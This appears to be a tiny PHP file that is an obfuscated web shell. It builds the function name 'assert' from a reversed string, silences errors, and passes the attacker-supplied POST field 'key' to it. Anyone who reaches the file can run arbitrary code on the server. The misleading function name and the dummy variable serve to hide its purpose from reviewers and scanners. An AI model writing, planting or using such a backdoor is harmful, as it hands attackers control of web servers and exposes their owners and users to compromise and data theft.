<?php
error_reporting(0);
$b="zxczxczxczxczxcxzczx";
function  yuag_array($b,$c){
$b=strrev($b);
array_map(substr_replace($b, 'ss', 1, 0),array($c));
}
yuag_array("trea",$_POST['key']);